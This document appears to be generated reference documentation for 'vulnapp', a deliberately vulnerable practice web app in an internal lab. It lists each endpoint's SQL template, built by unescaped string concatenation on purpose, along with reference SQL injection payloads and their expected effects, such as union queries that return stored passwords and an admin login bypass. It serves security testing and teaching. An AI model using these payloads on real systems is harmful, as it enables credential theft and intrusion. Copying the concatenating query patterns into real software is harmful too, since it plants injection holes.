# Endpoints vulnerables de vulnapp

Generado con `python -m vulnapp.docs`; no editar a mano. Una prueba unitaria falla si este archivo
difiere del registro en `vulnapp/queries.py` y `vulnapp/reference.py`.

Las consultas concatenan los valores sin escapar a propósito. Los payloads de referencia son
clásicos y públicos, y solo se dirigen a `vulnapp` dentro de la red interna del laboratorio.

Los errores de PostgreSQL se devuelven al cliente tal cual (HTTP 500), lo que hace posibles los
payloads de la familia `error`.

## catalog

- **Rutas:** `GET /catalog`
- **Parámetros:** `category`
- **Ubicaciones aceptadas:** query
- **Familias aplicables:** tautology, union
- **Entrada benigna:** `category=Libros`

Plantilla SQL:

```sql
SELECT id, name, price, category FROM products WHERE category = '{category}' AND hidden = false ORDER BY id
```

| Familia | Parámetro | Payload de referencia | Efecto esperado |
|---|---|---|---|
| tautology | `category` | `' OR '1'='1' --` | Devuelve más filas que la entrada benigna `Libros` |
| union | `category` | `' UNION SELECT id, username, 0, role FROM users --` | La respuesta contiene `admin` |

## search

- **Rutas:** `GET /search`, `POST /search`
- **Parámetros:** `q`
- **Ubicaciones aceptadas:** query, form, json
- **Familias aplicables:** union, error, boolean_blind
- **Entrada benigna:** `q=lap`

Plantilla SQL:

```sql
SELECT id, name, price FROM products WHERE name ILIKE '%{q}%' AND hidden = false ORDER BY id
```

| Familia | Parámetro | Payload de referencia | Efecto esperado |
|---|---|---|---|
| union | `q` | `' UNION SELECT id, username, 0 FROM users --` | La respuesta contiene `admin` |
| error | `q` | `' AND 1=CAST((SELECT version()) AS int) --` | Error de PostgreSQL que contiene `invalid input syntax for type integer` |
| boolean_blind | `q` | `lap%' AND 1=1 --` | Con `lap%' AND 1=2 --` (condición falsa) la respuesta difiere de la verdadera |

## product

- **Rutas:** `GET /product`
- **Parámetros:** `id`
- **Ubicaciones aceptadas:** query
- **Familias aplicables:** union, error, boolean_blind
- **Entrada benigna:** `id=3`

Plantilla SQL:

```sql
SELECT id, name, price, description FROM products WHERE id = {id} AND hidden = false
```

| Familia | Parámetro | Payload de referencia | Efecto esperado |
|---|---|---|---|
| union | `id` | `0 UNION SELECT id, username, 0, password FROM users --` | La respuesta contiene `admin123` |
| error | `id` | `1 AND 1=CAST((SELECT version()) AS int)` | Error de PostgreSQL que contiene `invalid input syntax for type integer` |
| boolean_blind | `id` | `3 AND 1=1` | Con `3 AND 1=2` (condición falsa) la respuesta difiere de la verdadera |

## login

- **Rutas:** `POST /login`
- **Parámetros:** `username`, `password`
- **Ubicaciones aceptadas:** form, json
- **Familias aplicables:** tautology
- **Entrada benigna:** `username=ana`, `password=ana2024`

Plantilla SQL:

```sql
SELECT id, username, role FROM users WHERE username = '{username}' AND password = '{password}'
```

| Familia | Parámetro | Payload de referencia | Efecto esperado |
|---|---|---|---|
| tautology | `username` | `admin' --` | La respuesta contiene `admin` |

## sort

- **Rutas:** `GET /products/sort`
- **Parámetros:** `order`
- **Ubicaciones aceptadas:** query
- **Familias aplicables:** error, boolean_blind
- **Entrada benigna:** `order=price`

Plantilla SQL:

```sql
SELECT id, name, price FROM products WHERE hidden = false ORDER BY {order}
```

| Familia | Parámetro | Payload de referencia | Efecto esperado |
|---|---|---|---|
| error | `order` | `CAST((SELECT version()) AS int)` | Error de PostgreSQL que contiene `invalid input syntax for type integer` |
| boolean_blind | `order` | `id, (SELECT CASE WHEN 1=1 THEN 1 ELSE 1/0 END)` | Con `id, (SELECT CASE WHEN 1=2 THEN 1 ELSE 1/0 END)` (condición falsa) la respuesta difiere de la verdadera |

## comments

- **Rutas:** `POST /comments/add`
- **Parámetros:** `body`
- **Ubicaciones aceptadas:** form, json
- **Familias aplicables:** stacked
- **Entrada benigna:** `body=Excelente producto`

Plantilla SQL:

```sql
INSERT INTO comments (product_id, author, body) VALUES (1, 'anon', '{body}')
```

| Familia | Parámetro | Payload de referencia | Efecto esperado |
|---|---|---|---|
| stacked | `body` | `x'); INSERT INTO comments (product_id, author, body) VALUES (1, 'stacked-comment', 'injected'); --` | Aparece un comentario del autor `stacked-comment` |

## orders

- **Rutas:** `GET /orders`, `POST /orders`
- **Parámetros:** `user_id`
- **Ubicaciones aceptadas:** query, json
- **Familias aplicables:** tautology, union, boolean_blind
- **Entrada benigna:** `user_id=2`

Plantilla SQL:

```sql
SELECT id, user_id, total, status FROM orders WHERE user_id = {user_id}
```

| Familia | Parámetro | Payload de referencia | Efecto esperado |
|---|---|---|---|
| tautology | `user_id` | `2 OR 1=1` | Devuelve más filas que la entrada benigna `2` |
| union | `user_id` | `0 UNION SELECT id, id, 0, username FROM users` | La respuesta contiene `admin` |
| boolean_blind | `user_id` | `2 AND 1=1` | Con `2 AND 1=2` (condición falsa) la respuesta difiere de la verdadera |

## cart_add

- **Rutas:** `POST /cart/add`
- **Parámetros:** `product_id`, `qty`
- **Ubicaciones aceptadas:** form, json
- **Familias aplicables:** error, stacked
- **Entrada benigna:** `product_id=4`, `qty=1`

Plantilla SQL:

```sql
INSERT INTO cart_items (user_id, product_id, qty) VALUES (2, {product_id}, {qty})
```

| Familia | Parámetro | Payload de referencia | Efecto esperado |
|---|---|---|---|
| error | `qty` | `CAST((SELECT version()) AS int)` | Error de PostgreSQL que contiene `invalid input syntax for type integer` |
| stacked | `qty` | `1); INSERT INTO comments (product_id, author, body) VALUES (1, 'stacked-cart', 'injected'); --` | Aparece un comentario del autor `stacked-cart` |

## Flujos benignos

| Ruta | Descripción |
|---|---|
| `GET /` | Productos destacados |
| `GET /health` | Estado del servicio |
| `GET /comments?product_id=` | Últimos comentarios de un producto (consulta parametrizada) |
| `GET /cart` | Carrito del usuario 2 (consulta parametrizada) |

Búsqueda, catálogo, login, carrito y comentarios benignos usan los endpoints de arriba con
entradas legítimas.
